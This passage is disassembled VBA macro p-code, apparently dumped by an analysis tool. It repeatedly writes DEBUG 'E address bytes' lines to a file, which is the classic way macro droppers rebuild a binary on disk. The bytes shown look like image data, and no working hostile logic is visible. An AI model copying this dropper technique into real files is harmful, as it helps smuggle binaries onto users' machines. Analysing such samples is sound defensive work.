' 	LitStr 0x0036 "E 8D40 5E 76 41 59 6F 32 4A 60 4C 64 7A 4F 67 7D 53 6C"
' 	PrintItemNL 
' Line #2455:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8D50 80 4B 64 78 52 6B 7F 5D 76 8A 6F 89 9A 69 83 94"
' 	PrintItemNL 
' Line #2456:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8D60 68 82 93 66 80 91 75 8E A2 7D 96 AA 53 6C 80 80"
' 	PrintItemNL 
' Line #2457:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8D70 9B AF 64 7F 94 60 7B 90 63 7E 92 4A 65 79 66 80"
' 	PrintItemNL 
' Line #2458:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8D80 91 76 8F 9F 8C A3 B3 8D A2 B1 5D 70 7D 4F 61 6C"
' 	PrintItemNL 
' Line #2459:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8D90 59 6A 73 66 78 7F 71 81 88 58 66 6C 2E 39 3D 08"
' 	PrintItemNL 
' Line #2460:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8DA0 14 16 49 55 57 00 0B 0D 00 00 EE F3 F1 E7 EC EA"
' 	PrintItemNL 
' Line #2461:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8DB0 DF E1 E1 CE D0 D0 C1 C3 C4 AF B3 B4 00 00 04 EC"
' 	PrintItemNL 
' Line #2462:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8DC0 F2 F7 DB E7 ED D4 E4 EA A7 B8 C1 A1 B4 BC C2 D4"
' 	PrintItemNL 
' Line #2463:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8DD0 DF D7 E9 F4 E1 F1 FE D5 E5 F1 DA EC F7 BB CF DA"
' 	PrintItemNL 
' Line #2464:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8DE0 6B 83 95 52 6D 82 44 60 78 4C 68 80 51 6C 81 6E"
' 	PrintItemNL 
' Line #2465:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8DF0 86 9C 5E 76 8A 51 68 7E 37 4E 64 22 37 4D 1E 32"
' 	PrintItemNL 
' Line #2466:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8E00 44 21 30 40 12 1C 26 2C 37 3B 35 46 43 41 50 4C"
' 	PrintItemNL 
' Line #2467:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8E10 38 42 42 2D 36 3F 3F 4A 60 50 61 82 4D 63 8C 45"
' 	PrintItemNL 
' Line #2468:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8E20 5D 87 3C 51 77 37 48 6F 39 48 6F 30 3D 69 3E 4E"
' 	PrintItemNL 
' Line #2469:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8E30 7D 35 45 74 33 43 6E 8B 9B C6 C2 D2 FF B0 BF F0"
' 	PrintItemNL 
' Line #2470:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8E40 AA B9 EA 8F 9F CE 7F 8E BF 4E 5E 8D 19 29 58 3C"
' 	PrintItemNL 
' Line #2471:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8E50 4C 7B 66 76 A4 56 65 93 4E 5D 8B 4B 5B 86 3F 4F"
' 	PrintItemNL 
' Line #2472:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8E60 7A 34 44 6F 32 42 6D 31 41 6C 36 43 71 35 42 70"
' 	PrintItemNL 
' Line #2473:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8E70 40 4F 7D 4A 5A 89 46 58 87 49 5D 8D 49 5C 8F 37"
' 	PrintItemNL 
' Line #2474:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8E80 4C 80 28 3D 71 47 5C 90 38 4C 7C 26 3B 68 16 29"
' 	PrintItemNL 
' Line #2475:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8E90 4F 29 3E 5E 4A 5F 7B 4D 62 7D 46 5E 76 4A 62 7A"
' 	PrintItemNL 
' Line #2476:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8EA0 38 50 68 41 59 71 43 5B 71 38 50 66 4D 65 7B 4A"
' 	PrintItemNL 
' Line #2477:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8EB0 62 78 4A 63 77 44 5D 71 4E 67 7B 5F 78 8C 70 8A"
' 	PrintItemNL 
' Line #2478:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8EC0 9B 5F 79 8A 60 7A 8B 68 82 93 77 90 A4 6A 85 99"
' 	PrintItemNL 
' Line #2479:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8ED0 54 6F 83 79 94 A8 67 82 97 67 82 97 62 7D 91 4F"
' 	PrintItemNL 
' Line #2480:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8EE0 6A 7E 68 80 92 7C 95 A5 8A 9F AE 7A 90 9C 58 6A"
' 	PrintItemNL 
' Line #2481:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8EF0 75 5C 6F 77 60 72 79 54 66 6D 54 64 6B 2F 3D 43"
' 	PrintItemNL 
' Line #2482:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8F00 1E 2A 2E 26 32 34 61 6D 6F 00 01 03 00 00 ED F2"
' 	PrintItemNL 
' Line #2483:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8F10 F0 E8 ED EB DF E1 E1 CF D1 D1 C2 C4 C5 AB AF B0"
' 	PrintItemNL 
' Line #2484:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8F20 00 00 04 E8 EE F3 EF FB FF B0 C0 C6 73 84 8D 9D"
' 	PrintItemNL 
' Line #2485:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8F30 B0 B8 DD EF FA D5 E7 F2 C4 D4 E1 C6 D6 E2 B8 C8"
' 	PrintItemNL 
' Line #2486:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8F40 D4 B8 CC D7 82 9A AC 59 74 89 53 6F 87 4F 6B 83"
' 	PrintItemNL 
' Line #2487:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8F50 48 63 78 60 78 8E 68 7F 95 58 6F 85 38 4F 65 28"
' 	PrintItemNL 
' Line #2488:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8F60 3D 52 23 35 46 21 31 3E 1B 26 2E 1D 29 2B 3F 4F"
' 	PrintItemNL 
' Line #2489:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8F70 48 4F 5E 56 40 4A 44 2F 38 3C 40 4A 5C 4E 5C 78"
' 	PrintItemNL 
' Line #2490:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8F80 46 5A 7D 3C 52 76 42 53 74 36 45 65 41 4D 71 30"
' 	PrintItemNL 
' Line #2491:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8F90 3A 62 38 45 71 2A 39 67 10 20 4B 68 78 A3 C6 D6"
' 	PrintItemNL 
' Line #2492:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8FA0 FF B4 C4 F3 B5 C5 F4 96 A6 D4 73 83 B2 25 35 63"
' 	PrintItemNL 
' Line #2493:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8FB0 19 29 54 52 62 8D 65 75 9F 54 62 8C 48 57 7E 42"
' 	PrintItemNL 
' Line #2494:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8FC0 51 78 37 46 6D 32 42 67 38 48 6D 3F 4C 72 43 4E"
' 	PrintItemNL 
' Line #2495:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8FD0 74 33 3D 65 2E 3A 62 39 47 71 3E 4F 7A 47 5A 87"
' 	PrintItemNL 
' Line #2496:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8FE0 4D 61 90 44 58 88 2B 40 73 4E 63 96 3E 52 82 26"
' 	PrintItemNL 
' Line #2497:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8FF0 3B 68 12 25 4B 28 3D 5D 4F 64 80 55 6B 84 4C 64"
' 	PrintItemNL 
' Line #2498:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9000 7C 48 60 78 36 4E 66 3E 56 6E 45 5D 73 3D 55 6B"
' 	PrintItemNL 
' Line #2499:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9010 4B 63 79 45 5D 73 3F 58 6C 43 5C 70 52 6B 7F 62"
' 	PrintItemNL 
' Line #2500:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9020 7B 8F 6E 88 99 59 73 84 5D 77 88 6C 86 97 81 9C"
' 	PrintItemNL 
' Line #2501:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9030 B0 5C 77 8C 5F 7A 8F 70 8D A2 68 85 9A 68 85 9A"
' 	PrintItemNL 
' Line #2502:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9040 56 71 85 4C 67 7B 75 8D 9F 83 9C AC 8A 9F AE 77"
' 	PrintItemNL 
' Line #2503:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9050 8D 99 5D 6F 7A 5B 6E 76 4E 60 67 32 42 49 50 61"
' 	PrintItemNL 
' Line #2504:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9060 6A 25 35 3C 1E 2A 2E 33 3F 41 5E 6A 6C 00 01 03"
' 	PrintItemNL 
' Line #2505:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9070 00 00 F2 F7 F5 EB F0 EE DF E1 E1 CB CD CD C0 C2"
' 	PrintItemNL 
' Line #2506:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9080 C3 B3 B7 B8 01 04 09 CC D2 D7 BF CB D1 8B 9B A1"
' 	PrintItemNL 
' Line #2507:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9090 77 88 91 AF C2 CA D1 E3 EE B3 C5 D0 9B AB B8 96"
' 	PrintItemNL 
' Line #2508:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 90A0 A6 B2 90 A0 AC 9A AE B9 7D 93 A5 51 6C 81 5B 77"
' 	PrintItemNL 
' Line #2509:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 90B0 8F 58 74 8C 46 60 78 48 60 76 73 8A A0 5E 75 8B"
' 	PrintItemNL 
' Line #2510:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 90C0 38 4F 65 23 38 4D 15 27 38 13 21 2D 20 2A 31 22"
' 	PrintItemNL 
' Line #2511:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 90D0 2C 2C 4B 5A 52 4F 5D 52 38 40 39 36 3B 3C 47 50"
' 	PrintItemNL 
' Line #2512:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 90E0 5E 43 51 68 3A 4C 69 41 53 70 4D 5C 76 44 4F 6A"
' 	PrintItemNL 
' Line #2513:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 90F0 4F 57 74 48 51 73 43 4F 77 26 36 60 0A 1A 44 3C"
' 	PrintItemNL 
' Line #2514:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9100 4C 76 AC BC EA B1 C1 EF B0 C0 EE 90 A0 CE 66 77"
' 	PrintItemNL 
' Line #2515:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9110 A2 1A 2B 56 3C 4C 76 60 6F 96 51 61 86 40 4D 73"
' 	PrintItemNL 
' Line #2516:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9120 38 46 6A 3D 49 6B 3C 48 6A 3D 4A 6A 42 4F 6F 47"
' 	PrintItemNL 
' Line #2517:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9130 52 72 3F 48 69 3A 43 65 37 41 63 3A 48 6C 38 48"
' 	PrintItemNL 
' Line #2518:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9140 6D 3B 4E 74 4B 5E 89 4A 5E 8D 32 46 76 4F 65 95"
' 	PrintItemNL 
' Line #2519:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9150 3E 52 81 29 3F 69 1C 2F 54 33 48 68 50 65 80 4B"
' 	PrintItemNL 
' Line #2520:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9160 61 7A 4B 63 7B 41 59 71 38 50 68 40 58 70 48 60"
' 	PrintItemNL 
' Line #2521:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9170 76 3A 52 68 43 5B 71 41 59 6F 39 52 66 4B 64 78"
' 	PrintItemNL 
' Line #2522:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9180 5A 73 87 63 7C 90 6A 84 95 57 71 82 62 7C 8D 70"
' 	PrintItemNL 
' Line #2523:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9190 8A 9B 86 A1 B6 50 6B 80 67 84 99 6A 87 9C 6D 8A"
' 	PrintItemNL 
' Line #2524:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 91A0 9F 6B 88 9D 4C 67 7B 4F 6A 7E 7C 94 A6 7C 95 A5"
' 	PrintItemNL 
' Line #2525:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 91B0 88 9D AC 8E A2 AD 85 98 A0 83 95 9C 83 93 9A 7C"
' 	PrintItemNL 
' Line #2526:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 91C0 8C 93 82 91 9A 51 61 68 4A 56 5A 56 62 64 61 6D"
' 	PrintItemNL 
' Line #2527:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 91D0 6F 00 01 03 00 00 F3 F8 F6 EA EF ED E0 E2 E2 CA"
' 	PrintItemNL 
' Line #2528:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 91E0 CC CC BF C1 C2 BB BF C0 00 02 07 96 9C A1 59 65"
' 	PrintItemNL 
' Line #2529:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 91F0 6B 6C 7C 82 74 85 8E 7E 91 99 92 A4 AF A6 B8 C3"
' 	PrintItemNL 
' Line #2530:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9200 B1 C1 CE A9 B9 C5 A2 B2 BE 9F B3 BE 8B A1 B3 51"
' 	PrintItemNL 
' Line #2531:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9210 6C 81 53 6F 87 58 74 8C 4E 68 80 45 60 75 69 81"
' 	PrintItemNL 
' Line #2532:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9220 97 63 7B 91 48 60 76 2C 44 58 1C 2F 3E 1A 28 34"
' 	PrintItemNL 
' Line #2533:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9230 2B 35 3C 2D 38 36 4A 59 51 49 57 4C 33 3A 33 3C"
' 	PrintItemNL 
' Line #2534:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9240 41 40 51 57 62 45 4F 61 3A 48 5F 3F 4D 64 2D 37"
' 	PrintItemNL 
' Line #2535:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9250 49 32 39 4C 34 39 4E 41 48 63 3B 47 69 2C 3C 61"
' 	PrintItemNL 
' Line #2536:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9260 31 43 68 35 46 6D 86 97 C2 A0 B3 DE 9A AB D6 86"
' 	PrintItemNL 
' Line #2537:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9270 97 C2 63 73 9D 26 37 5E 63 73 98 5E 6E 92 3C 4B"
' 	PrintItemNL 
' Line #2538:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9280 6C 30 3C 5E 33 3E 5E 3B 46 64 39 44 60 2F 3A 55"
' 	PrintItemNL 
' Line #2539:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9290 26 31 4C 21 2A 45 1B 22 3D 2A 30 4D 30 38 55 34"
' 	PrintItemNL 
' Line #2540:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 92A0 3F 5D 2C 3B 5B 2F 3F 63 45 58 7E 4A 5D 88 2A 3F"
' 	PrintItemNL 
' Line #2541:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 92B0 6C 4D 62 8F 40 55 82 31 47 70 25 38 5D 38 4D 6C"
' 	PrintItemNL 
' Line #2542:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 92C0 51 66 81 4B 61 7A 43 5B 73 39 51 69 3E 56 6E 46"
' 	PrintItemNL 
' Line #2543:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 92D0 5E 76 4A 62 78 32 4A 60 39 51 67 41 59 6F 3A 53"
' 	PrintItemNL 
' Line #2544:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 92E0 67 4C 65 79 5A 73 87 62 7B 8F 65 7F 90 53 6D 7E"
' 	PrintItemNL 
' Line #2545:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 92F0 65 7F 90 75 8F A0 77 92 A7 49 66 7B 68 84 9C 66"
' 	PrintItemNL 
' Line #2546:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9300 82 9A 72 8F A4 6D 8A 9F 4A 65 7A 5F 7A 8E 89 A1"
' 	PrintItemNL 
' Line #2547:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9310 B3 88 A1 B1 99 AE BD A3 B7 C2 A1 B4 BC 9C AE B5"
' 	PrintItemNL 
' Line #2548:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9320 A6 B6 BD AE BE C5 B3 C2 CB 7F 8C 94 75 81 87 87"
' 	PrintItemNL 
' Line #2549:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9330 92 96 76 81 85 00 06 0A 00 00 F1 F6 F4 E5 EA E8"
' 	PrintItemNL 
' Line #2550:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9340 E0 E2 E2 CD CF CF C1 C3 C4 B9 BD BE 00 00 04 6F"
' 	PrintItemNL 
' Line #2551:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9350 75 7A 77 83 89 98 A8 AE A0 B1 BA 9F B2 BA A7 B9"
' 	PrintItemNL 
' Line #2552:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9360 C4 A0 B2 BD 9F AF BC AE BE CA B8 C8 D4 AD C1 CC"
' 	PrintItemNL 
' Line #2553:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9370 A8 BE D0 68 83 98 52 6E 86 52 70 89 52 6C 84 49"
' 	PrintItemNL 
' Line #2554:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9380 64 79 50 68 7E 6B 83 99 60 78 8E 26 3E 52 10 23"
' 	PrintItemNL 
' Line #2555:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9390 32 19 28 31 2B 36 3A 30 3B 39 4B 58 50 51 5C 52"
' 	PrintItemNL 
' Line #2556:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 93A0 3B 3F 39 3F 41 41 50 55 5E 45 4C 5D 32 3D 51 21"
' 	PrintItemNL 
' Line #2557:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 93B0 2D 3F 18 1E 2B 27 2B 36 1E 21 30 2B 30 45 2B 35"
' 	PrintItemNL 
' Line #2558:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 93C0 53 30 3F 60 54 65 86 47 5B 7E 76 8A B3 9C AF DA"
' 	PrintItemNL 
' Line #2559:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 93D0 95 A6 D1 8E A0 C9 72 83 AA 3D 4F 74 6A 7A 9E 59"
' 	PrintItemNL 
' Line #2560:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 93E0 68 89 49 56 76 3E 49 67 3D 48 64 41 4B 63 34 3E"
' 	PrintItemNL 
' Line #2561:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 93F0 56 24 2C 43 18 21 35 10 19 2D 0E 12 2A 14 18 30"
' 	PrintItemNL 
' Line #2562:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9400 0E 15 2E 22 2B 46 34 40 5C 3B 4B 68 41 54 77 32"
' 	PrintItemNL 
' Line #2563:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9410 45 6B 22 35 60 47 5D 87 42 58 82 38 4F 75 27 3B"
' 	PrintItemNL 
' Line #2564:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9420 5E 34 49 68 52 67 82 55 6B 84 3B 53 6B 35 4D 65"
' 	PrintItemNL 
' Line #2565:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9430 46 5E 76 49 61 79 4A 62 78 2F 47 5D 35 4D 63 42"
' 	PrintItemNL 
' Line #2566:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9440 5A 70 3D 56 6A 43 5C 70 51 6A 7E 62 7B 8F 63 7D"
' 	PrintItemNL 
' Line #2567:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9450 8E 4E 68 79 69 83 94 77 92 A6 65 80 95 56 73 88"
' 	PrintItemNL 
' Line #2568:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9460 69 85 9D 68 84 9C 75 92 A7 67 84 99 47 62 77 6B"
' 	PrintItemNL 
' Line #2569:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9470 86 9A 88 A0 B4 8F A6 B6 96 AB BA 8D A1 AC 86 99"
' 	PrintItemNL 
' Line #2570:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9480 A1 81 93 9A 8A 98 9E 8A 98 9E 82 91 9A 64 71 79"
' 	PrintItemNL 
' Line #2571:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9490 5D 69 6F 6F 7A 7E 66 71 75 00 03 07 00 00 F1 F6"
' 	PrintItemNL 
' Line #2572:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 94A0 F4 E3 E8 E6 DD DF DF D1 D3 D3 C3 C5 C6 B3 B7 B8"
' 	PrintItemNL 
' Line #2573:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 94B0 00 00 04 79 7F 84 9B A7 AD 8E 9E A4 82 93 9C 8B"
' 	PrintItemNL 
' Line #2574:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 94C0 9E A6 91 A3 AE 83 95 A0 95 A5 B2 C3 D3 DF B7 C7"
' 	PrintItemNL 
' Line #2575:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 94D0 D3 A5 B9 C4 AE C4 D6 76 91 A6 54 70 88 52 70 89"
' 	PrintItemNL 
' Line #2576:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 94E0 4F 69 81 46 60 78 46 5E 74 66 7E 94 66 7F 93 24"
' 	PrintItemNL 
' Line #2577:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 94F0 3C 4E 11 24 33 17 26 2F 21 2C 30 3B 46 44 4D 59"
' 	PrintItemNL 
' Line #2578:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9500 53 4E 59 51 34 38 32 37 37 37 43 45 4F 39 3E 4D"
' 	PrintItemNL 
' Line #2579:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9510 25 2D 3E 08 11 1F 22 24 2E 2A 2C 34 21 23 2E 24"
' 	PrintItemNL 
' Line #2580:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9520 29 38 24 2E 46 24 32 4F 3C 4E 6B 4C 61 81 6B 80"
' 	PrintItemNL 
' Line #2581:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9530 A6 8E A4 CD 8D A1 CA 89 9C C2 69 7B A0 34 47 6A"
' 	PrintItemNL 
' Line #2582:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9540 32 43 64 31 40 60 50 5E 7A 3D 4A 64 33 3D 55 32"
' 	PrintItemNL 
' Line #2583:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9550 3B 4F 26 2F 43 1D 24 37 17 1F 30 13 1A 2B 0D 11"
' 	PrintItemNL 
' Line #2584:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9560 24 0B 0F 22 03 08 1D 23 2B 42 40 4C 64 42 50 6C"
' 	PrintItemNL 
' Line #2585:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9570 3C 4D 6E 22 35 5A 25 39 62 44 5A 83 3E 54 7D 3A"
' 	PrintItemNL 
' Line #2586:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9580 52 76 2C 41 61 35 4B 67 4F 65 7E 52 69 7F 37 4F"
' 	PrintItemNL 
' Line #2587:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9590 67 37 4F 67 4E 66 7E 47 5F 77 48 60 76 34 4C 62"
' 	PrintItemNL 
' Line #2588:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 95A0 39 51 67 42 5A 70 3D 56 6A 3D 56 6A 4C 65 79 63"
' 	PrintItemNL 
' Line #2589:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 95B0 7C 90 65 7F 90 54 6E 7F 74 8E 9F 7B 96 AA 53 6E"
' 	PrintItemNL 
' Line #2590:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 95C0 83 6A 86 9E 69 85 9D 6E 8A A2 76 92 AA 5E 7A 92"
' 	PrintItemNL 
' Line #2591:
' 	Ld hFile 
